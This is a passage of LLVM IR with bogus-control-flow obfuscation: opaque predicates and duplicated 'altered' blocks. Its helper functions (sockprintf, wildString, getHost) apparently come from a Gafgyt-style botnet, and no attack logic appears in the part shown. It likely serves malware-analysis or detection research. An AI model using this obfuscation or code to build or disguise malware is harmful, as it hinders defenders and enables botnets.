  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br i1 %135, label %144, label %170

; <label>:144:                                    ; preds = %originalBBpart225
  %145 = load i8**, i8*** %5, align 8
  %146 = load i8*, i8** %6, align 8
  %147 = load i8, i8* %146, align 1
  %148 = zext i8 %147 to i32
  call void @printchar(i8** %145, i32 %148)
  %149 = load i32, i32* %9, align 4
  %150 = add nsw i32 %149, 1
  store i32 %150, i32* %9, align 4
  br label %151

; <label>:151:                                    ; preds = %144
  %152 = load i32, i32* @x.35
  %153 = load i32, i32* @y.36
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %151
  %160 = load i8*, i8** %6, align 8
  %161 = getelementptr inbounds i8, i8* %160, i32 1
  store i8* %161, i8** %6, align 8
  %162 = load i32, i32* @x.35
  %163 = load i32, i32* @y.36
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart230, label %originalBB27alteredBB

originalBBpart230:                                ; preds = %originalBB27
  br label %124

; <label>:170:                                    ; preds = %originalBBpart225
  br label %171

; <label>:171:                                    ; preds = %originalBBpart246, %170
  %172 = load i32, i32* @x.35
  %173 = load i32, i32* @y.36
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %171
  %180 = load i32, i32* %7, align 4
  %181 = icmp sgt i32 %180, 0
  %182 = load i32, i32* @x.35
  %183 = load i32, i32* @y.36
  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br i1 %181, label %190, label %214

; <label>:190:                                    ; preds = %originalBBpart234
  %191 = load i8**, i8*** %5, align 8
  %192 = load i32, i32* %10, align 4
  call void @printchar(i8** %191, i32 %192)
  %193 = load i32, i32* %9, align 4
  %194 = add nsw i32 %193, 1
  store i32 %194, i32* %9, align 4
  br label %195

; <label>:195:                                    ; preds = %190
  %196 = load i32, i32* @x.35
  %197 = load i32, i32* @y.36
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %195
  %204 = load i32, i32* %7, align 4
  %205 = add nsw i32 %204, -1
  store i32 %205, i32* %7, align 4
  %206 = load i32, i32* @x.35
  %207 = load i32, i32* @y.36
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart246, label %originalBB36alteredBB

originalBBpart246:                                ; preds = %originalBB36
  br label %171

; <label>:214:                                    ; preds = %originalBBpart234
  %215 = load i32, i32* @x.35
  %216 = load i32, i32* @y.36
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %214
  %223 = load i32, i32* %9, align 4
  %224 = load i32, i32* @x.35
  %225 = load i32, i32* @y.36
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  ret i32 %223

originalBBalteredBB:                              ; preds = %originalBB, %17
  %232 = load i8*, i8** %12, align 8
  %233 = load i8, i8* %232, align 1
  %234 = icmp ne i8 %233, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %37
  %235 = load i32, i32* %11, align 4
  %_ = sub i32 0, %235
  %gen = add i32 %_, 1
  %_2 = sub i32 0, %235
  %gen3 = add i32 %_2, 1
  %_4 = sub i32 0, %235
  %gen5 = add i32 %_4, 1
  %236 = add nsw i32 %235, 1
  store i32 %236, i32* %11, align 4
  br label %originalBB1

originalBB9alteredBB:                             ; preds = %originalBB9, %82
  %237 = load i8**, i8*** %5, align 8
  %238 = load i32, i32* %10, align 4
  call void @printchar(i8** %237, i32 %238)
  %239 = load i32, i32* %9, align 4
  %_10 = shl i32 %239, 1
  %_11 = sub i32 0, %239
  %gen12 = add i32 %_11, 1
  %_13 = shl i32 %239, 1
  %_14 = sub i32 %239, 1
  %gen15 = mul i32 %_14, 1
  %240 = add nsw i32 %239, 1
  store i32 %240, i32* %9, align 4
  br label %originalBB9

originalBB19alteredBB:                            ; preds = %originalBB19, %106
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %124
  %241 = load i8*, i8** %6, align 8
  %242 = load i8, i8* %241, align 1
  %243 = icmp ne i8 %242, 0
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %151
  %244 = load i8*, i8** %6, align 8
  %245 = getelementptr inbounds i8, i8* %244, i32 1
  store i8* %245, i8** %6, align 8
  br label %originalBB27

originalBB32alteredBB:                            ; preds = %originalBB32, %171
  %246 = load i32, i32* %7, align 4
  %247 = icmp sgt i32 %246, 0
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %195
  %248 = load i32, i32* %7, align 4
  %_37 = shl i32 %248, -1
  %_38 = sub i32 0, %248
  %gen39 = add i32 %_38, -1
  %_40 = sub i32 0, %248
  %gen41 = add i32 %_40, -1
  %_42 = sub i32 %248, -1
  %gen43 = mul i32 %_42, -1
  %_44 = shl i32 %248, -1
  %249 = add nsw i32 %248, -1
  store i32 %249, i32* %7, align 4
  br label %originalBB36

originalBB48alteredBB:                            ; preds = %originalBB48, %214
  %250 = load i32, i32* %9, align 4
  br label %originalBB48
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %182

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %61

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %61

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* @x.37
  %41 = load i32, i32* @y.38
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %39
  %48 = load i32, i32* %10, align 4
  %49 = icmp slt i32 %48, 0
  %50 = load i32, i32* @x.37
  %51 = load i32, i32* @y.38
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %49, label %58, label %61

; <label>:58:                                     ; preds = %originalBBpart2
  store i32 1, i32* %19, align 4
  %59 = load i32, i32* %10, align 4
  %60 = sub nsw i32 0, %59
  store i32 %60, i32* %21, align 4
  br label %61

; <label>:61:                                     ; preds = %58, %originalBBpart2, %36, %33
  %62 = load i32, i32* @x.37
  %63 = load i32, i32* @y.38
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %71 = getelementptr inbounds i8, i8* %70, i64 12
  %72 = getelementptr inbounds i8, i8* %71, i64 -1
  store i8* %72, i8** %17, align 8
  %73 = load i8*, i8** %17, align 8
  store i8 0, i8* %73, align 1
  %74 = load i32, i32* @x.37
  %75 = load i32, i32* @y.38
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %82

; <label>:82:                                     ; preds = %97, %originalBBpart24
  %83 = load i32, i32* %21, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %106

; <label>:85:                                     ; preds = %82
  %86 = load i32, i32* %21, align 4
  %87 = load i32, i32* %11, align 4
  %88 = urem i32 %86, %87
  store i32 %88, i32* %18, align 4
  %89 = load i32, i32* %18, align 4
  %90 = icmp sge i32 %89, 10
  br i1 %90, label %91, label %97

; <label>:91:                                     ; preds = %85
  %92 = load i32, i32* %15, align 4
  %93 = sub nsw i32 %92, 48
  %94 = sub nsw i32 %93, 10
  %95 = load i32, i32* %18, align 4
  %96 = add nsw i32 %95, %94
  store i32 %96, i32* %18, align 4
  br label %97

; <label>:97:                                     ; preds = %91, %85
  %98 = load i32, i32* %18, align 4
  %99 = add nsw i32 %98, 48
  %100 = trunc i32 %99 to i8
  %101 = load i8*, i8** %17, align 8
  %102 = getelementptr inbounds i8, i8* %101, i32 -1
  store i8* %102, i8** %17, align 8
  store i8 %100, i8* %102, align 1
  %103 = load i32, i32* %11, align 4
  %104 = load i32, i32* %21, align 4
  %105 = udiv i32 %104, %103
  store i32 %105, i32* %21, align 4
  br label %82

; <label>:106:                                    ; preds = %82
  %107 = load i32, i32* %19, align 4
  %108 = icmp ne i32 %107, 0
  br i1 %108, label %109, label %158

; <label>:109:                                    ; preds = %106
  %110 = load i32, i32* @x.37
  %111 = load i32, i32* @y.38
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %109
  %118 = load i32, i32* %13, align 4
  %119 = icmp ne i32 %118, 0
  %120 = load i32, i32* @x.37
  %121 = load i32, i32* @y.38
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %119, label %128, label %154

; <label>:128:                                    ; preds = %originalBBpart28
  %129 = load i32, i32* @x.37
  %130 = load i32, i32* @y.38
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %128
  %137 = load i32, i32* %14, align 4
  %138 = and i32 %137, 2
  %139 = icmp ne i32 %138, 0
  %140 = load i32, i32* @x.37
  %141 = load i32, i32* @y.38
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBBpart215, label %originalBB10alteredBB

originalBBpart215:                                ; preds = %originalBB10
  br i1 %139, label %148, label %154

; <label>:148:                                    ; preds = %originalBBpart215
  %149 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %149, i32 45)
  %150 = load i32, i32* %20, align 4
  %151 = add nsw i32 %150, 1
  store i32 %151, i32* %20, align 4
  %152 = load i32, i32* %13, align 4
  %153 = add nsw i32 %152, -1
  store i32 %153, i32* %13, align 4
  br label %157

; <label>:154:                                    ; preds = %originalBBpart215, %originalBBpart28
  %155 = load i8*, i8** %17, align 8
  %156 = getelementptr inbounds i8, i8* %155, i32 -1
  store i8* %156, i8** %17, align 8
  store i8 45, i8* %156, align 1
  br label %157

; <label>:157:                                    ; preds = %154, %148
  br label %158

; <label>:158:                                    ; preds = %157, %106
  %159 = load i32, i32* @x.37
  %160 = load i32, i32* @y.38
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %158
  %167 = load i32, i32* %20, align 4
  %168 = load i8**, i8*** %9, align 8
  %169 = load i8*, i8** %17, align 8
  %170 = load i32, i32* %13, align 4
  %171 = load i32, i32* %14, align 4
  %172 = call i32 @prints(i8** %168, i8* %169, i32 %170, i32 %171)
  %173 = add nsw i32 %167, %172
  store i32 %173, i32* %8, align 4
  %174 = load i32, i32* @x.37
  %175 = load i32, i32* @y.38
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBBpart220, label %originalBB17alteredBB

originalBBpart220:                                ; preds = %originalBB17
  br label %182

; <label>:182:                                    ; preds = %originalBBpart220, %25
  %183 = load i32, i32* %8, align 4
  ret i32 %183

originalBBalteredBB:                              ; preds = %originalBB, %39
  %184 = load i32, i32* %10, align 4
  %185 = icmp slt i32 %184, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  %186 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %187 = getelementptr inbounds i8, i8* %186, i64 12
  %188 = getelementptr inbounds i8, i8* %187, i64 -1
  store i8* %188, i8** %17, align 8
  %189 = load i8*, i8** %17, align 8
  store i8 0, i8* %189, align 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %109
  %190 = load i32, i32* %13, align 4
  %191 = icmp ne i32 %190, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %128
  %192 = load i32, i32* %14, align 4
  %_ = sub i32 %192, 2
  %gen = mul i32 %_, 2
  %_11 = shl i32 %192, 2
  %_12 = sub i32 0, %192
  %gen13 = add i32 %_12, 2
  %193 = and i32 %192, 2
  %194 = icmp ne i32 %193, 0
  br label %originalBB10

originalBB17alteredBB:                            ; preds = %originalBB17, %158
  %195 = load i32, i32* %20, align 4
  %196 = load i8**, i8*** %9, align 8
  %197 = load i8*, i8** %17, align 8
  %198 = load i32, i32* %13, align 4
  %199 = load i32, i32* %14, align 4
  %200 = call i32 @prints(i8** %196, i8* %197, i32 %198, i32 %199)
  %_18 = shl i32 %195, %200
  %201 = add nsw i32 %195, %200
  store i32 %201, i32* %8, align 4
  br label %originalBB17
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  %19 = load i32, i32* @x.39
  %20 = load i32, i32* @y.40
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i32, i32* @x.39
  %28 = load i32, i32* @y.40
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %18
  br label %originalBB
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = load i32, i32* @x.41
  %4 = load i32, i32* @y.42
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %11, align 8
  store i8* %1, i8** %12, align 8
  %14 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %13, i32 0, i32 0
  %15 = bitcast %struct.__va_list_tag* %14 to i8*
  call void @llvm.va_start(i8* %15)
  %16 = load i8*, i8** %12, align 8
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %13, i32 0, i32 0
  %18 = call i32 @print(i8** %11, i8* %16, %struct.__va_list_tag* %17)
  %19 = load i32, i32* @x.41
  %20 = load i32, i32* @y.42
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %18

originalBBalteredBB:                              ; preds = %originalBB, %2
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %27, align 8
  store i8* %1, i8** %28, align 8
  %30 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %29, i32 0, i32 0
  %31 = bitcast %struct.__va_list_tag* %30 to i8*
  call void @llvm.va_start(i8* %31)
  %32 = load i8*, i8** %28, align 8
  %33 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %29, i32 0, i32 0
  %34 = call i32 @print(i8** %27, i8* %32, %struct.__va_list_tag* %33)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #9
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.261, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #9
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #5
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %92

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

; <label>:31:                                     ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

; <label>:33:                                     ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %92

; <label>:37:                                     ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

; <label>:42:                                     ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* %44, i8* %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

; <label>:50:                                     ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %92

; <label>:54:                                     ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 %57) #9
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 %61) #9
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

; <label>:64:                                     ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* %66, i8* %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

; <label>:72:                                     ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = load i32, i32* @x.45
  %75 = load i32, i32* @y.46
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %72
  %82 = xor i1 %73, true
  %83 = zext i1 %82 to i32
  store i32 %83, i32* %3, align 4
  %84 = load i32, i32* @x.45
  %85 = load i32, i32* @y.46
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %92

; <label>:92:                                     ; preds = %originalBBpart2, %50, %33, %9
  %93 = load i32, i32* %3, align 4
  ret i32 %93

originalBBalteredBB:                              ; preds = %originalBB, %72
  %_ = sub i1 %73, true
  %gen = mul i1 %_, true
  %_1 = sub i1 %73, true
  %gen2 = mul i1 %_1, true
  %_3 = sub i1 false, %73
  %gen4 = add i1 %_3, true
  %94 = xor i1 %73, true
  %95 = zext i1 %94 to i32
  store i32 %95, i32* %3, align 4
  br label %originalBB
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
